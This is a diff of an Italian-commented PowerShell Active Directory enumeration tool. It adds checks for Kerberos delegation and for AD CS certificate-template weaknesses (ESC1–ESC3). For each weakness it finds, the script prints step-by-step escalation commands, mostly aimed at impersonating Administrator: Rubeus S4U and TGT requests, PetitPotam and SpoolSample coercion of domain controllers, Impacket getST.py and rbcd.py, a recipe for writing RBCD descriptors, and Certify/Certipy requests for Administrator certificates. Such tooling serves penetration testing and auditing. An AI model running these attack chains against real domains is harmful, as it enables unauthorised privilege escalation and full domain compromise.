+                catch {}
+            }
+            
+            $rbcdDelegation += [PSCustomObject]@{
+                Name = $name
+                Type = $type
+                DN = $dn
+                AllowedPrincipals = $allowedPrincipals
+            }
+        }
+    }
+    catch {
+        Write-Warning "Errore ricerca RBCD: $_"
+    }
+    #endregion
+    
+    #region Output Risultati
+    
+    # Unconstrained Delegation
+    if ($unconstrainedDelegation.Count -gt 0) {
+        Write-Section "UNCONSTRAINED DELEGATION TROVATA! ($($unconstrainedDelegation.Count))"
+        Write-Warning "CRITICO: Questi oggetti possono impersonare QUALSIASI utente!"
+        Write-Both ""
+        
+        foreach ($obj in $unconstrainedDelegation) {
+            Write-Warning "$($obj.Name) [$($obj.Type)]"
+            Write-Finding "DN" $obj.DN
+            Write-Both ""
+        }
+        
+        Write-Info "Attacco: Se comprometti questo sistema, puoi:"
+        Write-Both "        1. Forzare un DC a connettersi (PrinterBug/PetitPotam)" -Color Yellow
+        Write-Both "        2. Catturare il TGT del DC" -Color Yellow
+        Write-Both "        3. Usare il TGT per DCSync" -Color Yellow
+        Write-Both ""
+        Write-Both "        # Rubeus - monitora TGT in arrivo" -Color Yellow
+        Write-Both "        Rubeus.exe monitor /interval:5 /filteruser:DC$" -Color Gray
+        Write-Both ""
+        Write-Both "        # SpoolSample - forza connessione da DC" -Color Yellow
+        Write-Both "        SpoolSample.exe DC01 YOURCOMPROMISEDSERVER" -Color Gray
+        Write-Both ""
+        Write-Both "        # PetitPotam" -Color Yellow
+        Write-Both "        python3 PetitPotam.py YOURCOMPROMISEDSERVER DC01" -Color Gray
+        
+    } else {
+        Write-Info "Nessuna Unconstrained Delegation trovata (esclusi DC)"
+    }
+    
+    # Constrained Delegation
+    if ($constrainedDelegation.Count -gt 0) {
+        Write-Section "CONSTRAINED DELEGATION TROVATA ($($constrainedDelegation.Count))"
+        
+        foreach ($obj in $constrainedDelegation) {
+            $ptFlag = if ($obj.ProtocolTransition) { "[PROTOCOL TRANSITION]" } else { "" }
+            Write-Warning "$($obj.Name) [$($obj.Type)] $ptFlag"
+            
+            Write-Finding "Può delegare verso" "" -Important
+            foreach ($target in $obj.DelegateTo) {
+                Write-Both "            -> $target" -Color Red
+            }
+            
+            if ($obj.ProtocolTransition) {
+                Write-Finding "Protocol Transition" "ABILITATO - può impersonare senza autenticazione Kerberos iniziale!" -Important
+            }
+            Write-Both ""
+        }
+        
+        Write-Info "Attacco con credenziali/hash dell'account:"
+        Write-Both ""
+        Write-Both "        # Rubeus - S4U2Self + S4U2Proxy" -Color Yellow
+        Write-Both "        Rubeus.exe s4u /user:<account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_spn> /ptt" -Color Gray
+        Write-Both ""
+        Write-Both "        # Impacket - getST.py" -Color Yellow
+        Write-Both "        getST.py -spn <target_spn> -impersonate Administrator domain/<account>:<password>" -Color Gray
+        Write-Both "        getST.py -spn <target_spn> -impersonate Administrator -hashes :<ntlm> domain/<account>" -Color Gray
+        
+        # Evidenzia casi particolarmente pericolosi
+        $ldapDelegation = $constrainedDelegation | Where-Object { $_.DelegateTo -match 'ldap/' }
+        if ($ldapDelegation) {
+            Write-Both ""
+            Write-Warning "ATTENZIONE: Delegation verso LDAP trovata - possibile DCSync!"
+            foreach ($obj in $ldapDelegation) {
+                Write-Both "        $($obj.Name) può delegare verso LDAP -> DCSync possibile!" -Color Red
+            }
+        }
+        
+        $cifsTodc = $constrainedDelegation | Where-Object { $_.DelegateTo -match 'cifs/.*dc|cifs/.*domain' }
+        if ($cifsTodc) {
+            Write-Both ""
+            Write-Warning "ATTENZIONE: Delegation CIFS verso DC trovata!"
+        }
+        
+    } else {
+        Write-Both ""
+        Write-Info "Nessuna Constrained Delegation trovata"
+    }
+    
+    # RBCD
+    if ($rbcdDelegation.Count -gt 0) {
+        Write-Section "RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) TROVATA ($($rbcdDelegation.Count))"
+        
+        foreach ($obj in $rbcdDelegation) {
+            Write-Warning "$($obj.Name) [$($obj.Type)]"
+            Write-Finding "Possono delegare verso questo oggetto" "" -Important
+            foreach ($principal in $obj.AllowedPrincipals) {
+                Write-Both "            <- $principal" -Color Red
+            }
+            Write-Both ""
+        }
+        
+        Write-Info "Se controlli uno dei principal autorizzati:"
+        Write-Both ""
+        Write-Both "        # Rubeus - RBCD attack" -Color Yellow
+        Write-Both "        Rubeus.exe s4u /user:<controlled_account>$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /ptt" -Color Gray
+        Write-Both ""
+        Write-Both "        # Impacket" -Color Yellow
+        Write-Both "        getST.py -spn cifs/<target> -impersonate Administrator -hashes :<hash> domain/<controlled_account>$" -Color Gray
+        
+    } else {
+        Write-Both ""
+        Write-Info "Nessuna RBCD configurata"
+    }
+    
+    # Suggerimenti per configurare RBCD
+    Write-Section "CONFIGURARE RBCD (se hai GenericAll/GenericWrite su un computer)"
+    Write-Both "        # Requisito: devi controllare un account con SPN (es. machine account)" -Color Yellow
+    Write-Both ""
+    Write-Both "        # PowerShell - configura RBCD" -Color Yellow
+    Write-Both '        $TargetComputer = "TARGET$"' -Color Gray
+    Write-Both '        $AttackerSID = (Get-ADComputer YOURCOMPUTER).SID' -Color Gray
+    Write-Both '        $SD = New-Object Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID")' -Color Gray
+    Write-Both '        $SDBytes = New-Object byte[] ($SD.BinaryLength)' -Color Gray
+    Write-Both '        $SD.GetBinaryForm($SDBytes, 0)' -Color Gray
+    Write-Both '        Set-ADComputer -Identity $TargetComputer -Replace @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$SDBytes}' -Color Gray
+    Write-Both ""
+    Write-Both "        # Impacket - rbcd.py (più semplice)" -Color Yellow
+    Write-Both "        rbcd.py -delegate-from 'YOURCOMPUTER$' -delegate-to 'TARGET$' -action write 'domain/user:password'" -Color Gray
+    Write-Both ""
+    Write-Both "        # Poi attacca con getST.py come sopra" -Color Yellow
+    #endregion
+}
+
+function Get-ADCSVulnerabilities {
+    Write-Banner "AD CS (Active Directory Certificate Services)"
+    
+    Write-Section "Analisi Certificate Templates per vulnerabilità ESC"
+    Write-Info "Cerca: ESC1, ESC2, ESC3, ESC4, ESC6, ESC7"
+    Write-Both ""
+    
+    $vulnerableTemplates = @()
+    $enrollmentAgentTemplates = @()
+    
+    try {
+        $DN = ([adsi]'').distinguishedName
+        $configDN = "CN=Configuration,$DN"
+        $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+        
+        # Query Certificate Templates
+        $configEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$configDN")
+        $searcher = New-Object System.DirectoryServices.DirectorySearcher($configEntry)
+        $searcher.Filter = "(objectClass=pKICertificateTemplate)"
+        $searcher.PageSize = 1000
+        
+        $templates = $searcher.FindAll()
+        
+        Write-SubSection "Analisi di $($templates.Count) certificate templates..."
+        
+        # EKU OIDs
+        $CLIENT_AUTH_OID = '1.3.6.1.5.5.7.3.2'
+        $SMART_CARD_LOGON_OID = '1.3.6.1.4.1.311.20.2.2'
+        $PKINIT_CLIENT_AUTH_OID = '1.3.6.1.5.2.3.4'
+        $ANY_PURPOSE_OID = '2.5.29.37.0'
+        $CERTIFICATE_REQUEST_AGENT_OID = '1.3.6.1.4.1.311.20.2.1'
+        $PKCS_REQUEST_AGENT_OID = '1.3.6.1.4.1.311.10.3.4'
+        
+        # Flag constants
+        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1
+        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME = 2
+        $CT_FLAG_PEND_ALL_REQUESTS = 2  # In enrollment flag
+        
+        foreach ($template in $templates) {
+            $props = $template.Properties
+            $name = $props.cn[0]
+            $displayName = if ($props.displayname) { $props.displayname[0] } else { $name }
+            
+            $vulns = @()
+            $details = @()
+            
+            # Recupera flags
+            $nameFlag = if ($props.'mspki-certificate-name-flag') { [int64]$props.'mspki-certificate-name-flag'[0] } else { 0 }
+            $enrollmentFlag = if ($props.'mspki-enrollment-flag') { [int64]$props.'mspki-enrollment-flag'[0] } else { 0 }
+            $raSignature = if ($props.'mspki-ra-signature') { [int]$props.'mspki-ra-signature'[0] } else { 0 }
+            $schemaVersion = if ($props.'mspki-template-schema-version') { [int]$props.'mspki-template-schema-version'[0] } else { 1 }
+            
+            # EKU (Extended Key Usage)
+            $eku = @()
+            if ($props.pkiextendedkeyusage) {
+                $eku = @($props.pkiextendedkeyusage)
+            }
+            if ($props.'mspki-certificate-application-policy') {
+                $eku += @($props.'mspki-certificate-application-policy')
+            }
+            
+            # Analisi condizioni
+            $enrolleeSuppliesSubject = ($nameFlag -band $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) -ne 0
+            $enrolleeSuppliesSAN = ($nameFlag -band $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME) -ne 0
+            $noManagerApproval = ($enrollmentFlag -band $CT_FLAG_PEND_ALL_REQUESTS) -eq 0
+            $noAuthorizedSignatures = $raSignature -eq 0
+            
+            # Client Auth capability check
+            $hasClientAuth = ($eku -contains $CLIENT_AUTH_OID) -or 
+                             ($eku -contains $SMART_CARD_LOGON_OID) -or 
+                             ($eku -contains $PKINIT_CLIENT_AUTH_OID) -or 
+                             ($eku -contains $ANY_PURPOSE_OID) -or 
+                             ($eku.Count -eq 0)  # No EKU = Any purpose
+            
+            # ESC1: Enrollee supplies subject + Client Auth EKU + No manager approval + No signatures
+            if (($enrolleeSuppliesSubject -or $enrolleeSuppliesSAN) -and $hasClientAuth -and $noManagerApproval -and $noAuthorizedSignatures) {
+                $vulns += "ESC1"
+                $details += "Enrollee può specificare Subject/SAN arbitrario"
+            }
+            
+            # ESC2: Any Purpose EKU o nessun EKU (può essere usato per qualsiasi scopo)
+            if ((($eku -contains $ANY_PURPOSE_OID) -or ($eku.Count -eq 0)) -and $noManagerApproval -and $noAuthorizedSignatures) {
+                if ("ESC1" -notin $vulns) {  # Non duplicare se già ESC1
+                    $vulns += "ESC2"
+                    $details += "Any Purpose EKU o nessun EKU"
+                }
+            }
+            
+            # ESC3: Certificate Request Agent EKU (può richiedere cert per altri utenti)
+            if (($eku -contains $CERTIFICATE_REQUEST_AGENT_OID) -or ($eku -contains $PKCS_REQUEST_AGENT_OID)) {
+                if ($noManagerApproval -and $noAuthorizedSignatures) {
+                    $vulns += "ESC3"
+                    $details += "Certificate Request Agent - può richiedere cert per altri"
+                    $enrollmentAgentTemplates += $name
+                }
+            }
+            
+            # Salva se vulnerabile
+            if ($vulns.Count -gt 0) {
+                $vulnerableTemplates += [PSCustomObject]@{
+                    Name = $name
+                    DisplayName = $displayName
+                    Vulnerabilities = $vulns
+                    Details = $details
+                    EnrolleeSuppliesSubject = $enrolleeSuppliesSubject
+                    EnrolleeSuppliesSAN = $enrolleeSuppliesSAN
+                    HasClientAuth = $hasClientAuth
+                    ManagerApproval = (-not $noManagerApproval)
+                    AuthorizedSignatures = $raSignature
+                    EKU = $eku
+                }
+            }
+        }
+    }
+    catch {
+        Write-Warning "Errore analisi AD CS: $_"
+        Write-Info "AD CS potrebbe non essere installato"
+        return
+    }
+    
+    # Output risultati
+    if ($vulnerableTemplates.Count -gt 0) {
+        Write-Section "CERTIFICATE TEMPLATES VULNERABILI! ($($vulnerableTemplates.Count))"
+        
+        foreach ($t in $vulnerableTemplates) {
+            Write-Warning "$($t.Name) - $($t.Vulnerabilities -join ', ')"
+            
+            foreach ($detail in $t.Details) {
+                Write-Finding "Dettaglio" $detail -Important
+            }
+            
+            if ($t.EnrolleeSuppliesSubject) {
+                Write-Finding "ENROLLEE_SUPPLIES_SUBJECT" "ENABLED (può specificare qualsiasi utente)" -Important
+            }
+            if ($t.EnrolleeSuppliesSAN) {
+                Write-Finding "ENROLLEE_SUPPLIES_SAN" "ENABLED (può specificare SAN arbitrario)" -Important
+            }
+            if (-not $t.ManagerApproval) {
+                Write-Finding "Manager Approval" "NON RICHIESTO"
+            }
+            if ($t.AuthorizedSignatures -eq 0) {
+                Write-Finding "Authorized Signatures" "NON RICHIESTE"
+            }
+            Write-Both ""
+        }
+        
+        Write-Section "ATTACCHI AD CS"
+        
+        # ESC1 Attack
+        $esc1Templates = $vulnerableTemplates | Where-Object { $_.Vulnerabilities -contains "ESC1" }
+        if ($esc1Templates) {
+            Write-Warning "ESC1 - Richiedi certificato come qualsiasi utente:"
+            Write-Both ""
+            Write-Both "        # Certify - trova CA e richiedi cert come Domain Admin" -Color Yellow
+            Write-Both "        Certify.exe find /vulnerable" -Color Gray
+            Write-Both "        Certify.exe request /ca:CA-SERVER\CA-NAME /template:$($esc1Templates[0].Name) /altname:Administrator" -Color Gray
+            Write-Both ""
+            Write-Both "        # Certipy (da Kali)" -Color Yellow
+            Write-Both "        certipy req -u user@domain -p 'password' -ca CA-NAME -target ca-server -template $($esc1Templates[0].Name) -upn Administrator@domain" -Color Gray
+            Write-Both ""
+        }
+
+        # ESC3 Attack
+        if ($enrollmentAgentTemplates.Count -gt 0) {
+            Write-Warning "ESC3 - Certificate Request Agent disponibile:"
+            Write-Both ""
+            Write-Both "        # Step 1: Ottieni Enrollment Agent certificate" -Color Yellow
+            Write-Both "        Certify.exe request /ca:CA-SERVER\CA-NAME /template:$($enrollmentAgentTemplates[0])" -Color Gray
+            Write-Both ""
+            Write-Both "        # Step 2: Usa l'agent cert per richiedere cert per altri utenti" -Color Yellow
+            Write-Both "        Certify.exe request /ca:CA-SERVER\CA-NAME /template:User /onbehalfof:DOMAIN\Administrator /enrollcert:agent.pfx" -Color Gray
+            Write-Both ""
+        }
+
+        Write-Section "POST-EXPLOITATION CON CERTIFICATO"
+        Write-Both "        # Converti PEM a PFX" -Color Yellow
+        Write-Both "        openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx" -Color Gray
+        Write-Both ""
+        Write-Both "        # Rubeus - ottieni TGT con il certificato" -Color Yellow
+        Write-Both "        Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt" -Color Gray
+        Write-Both ""
+        Write-Both "        # Certipy - autenticazione diretta" -Color Yellow
+        Write-Both "        certipy auth -pfx administrator.pfx -dc-ip DC_IP" -Color Gray
+        
+    } else {
+        Write-Info "Nessun template vulnerabile trovato (ESC1-ESC3)"
+    }
+    
+    # Nota su ESC4-ESC8
+    Write-Section "NOTE SU ALTRE VULNERABILITÀ ESC"
+    Write-Info "ESC4: Permessi di scrittura su template -> Controlla Get-ACLAbuse per CertTemplate"
+    Write-Info "ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 su CA -> certipy find -vulnerable"
+    Write-Info "ESC7: Manage CA permission -> certipy find -vulnerable"
+    Write-Info "ESC8: HTTP enrollment endpoint -> certipy find -vulnerable"
+    Write-Both ""
+    Write-Both "        # Analisi completa con Certipy" -Color Yellow
+    Write-Both "        certipy find -u user@domain -p 'password' -dc-ip DC_IP -vulnerable" -Color Gray
+}
+
 #region Main Function
 
 function Invoke-ADEnum {
     param(
         [switch]$Quick,
         [switch]$Full,
-        [switch]$Sessions
+        [switch]$Sessions,
+        [string]$OutputFile
     )
-    
+
+    # Inizializza output file se specificato
+    if ($OutputFile) {
+        $script:OutputFile = $OutputFile
+        Set-Content -Path $OutputFile -Value "# AD-Enum Report - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+        Add-Content -Path $OutputFile -Value "# User: $env:USERDOMAIN\$env:USERNAME"
+        Add-Content -Path $OutputFile -Value ""
+    }
+
     $startTime = Get-Date
-    
-    Write-Host "[*] Avvio enumerazione: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Green
-    Write-Host "[*] Utente corrente: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Green
-    Write-Host ""
-    
+
+    Write-Both "[*] Avvio enumerazione: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Color Green
+    Write-Both "[*] Utente corrente: $env:USERDOMAIN\$env:USERNAME" -Color Green
+    Write-Both ""
+
     # Enumerazione base
     Get-DomainInfo
     Get-PasswordPolicy
     Get-DomainUsers
-    Get-DomainGroups
     Get-SPNs
+    Get-DomainGroups
     Get-DomainComputers
-    
+    Get-OrganizationalUnits
+
     if ($Full -or $Sessions) {
         Get-GPOs
+        Get-GPOLinks
         Get-DomainShares
         Get-ACLAbuse
+        Get-LAPSPasswords
+        Get-DelegationInfo
+        Get-ADCSVulnerabilities
         Get-LocalAdminAccess
         Get-DomainLoggedOnUsers
         Get-DomainSessionsWMI
         Get-DCOMAccess
+        Get-RemoteAccessPermissions
     }
-    
+
     # Riepilogo finale
     $endTime = Get-Date
     $duration = $endTime - $startTime
-    
-    Write-Host ""
-    Write-Host "[*] Completato in: $($duration.TotalSeconds.ToString('0.00')) secondi" -ForegroundColor Green
+
+    Write-Both ""
+    Write-Both "[*] Completato in: $($duration.TotalSeconds.ToString('0.00')) secondi" -Color Green
+
+    # Cleanup
+    if ($script:OutputFile) {
+        Add-Content -Path $script:OutputFile -Value ""
+        Add-Content -Path $script:OutputFile -Value "# Completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+    }
+    $script:OutputFile = $null
 }
 
 #endregion
-
-# Se eseguito direttamente, lancia l'enumerazione
-if ($MyInvocation.InvocationName -ne '.') {
-    Invoke-ADEnum -Full
-}
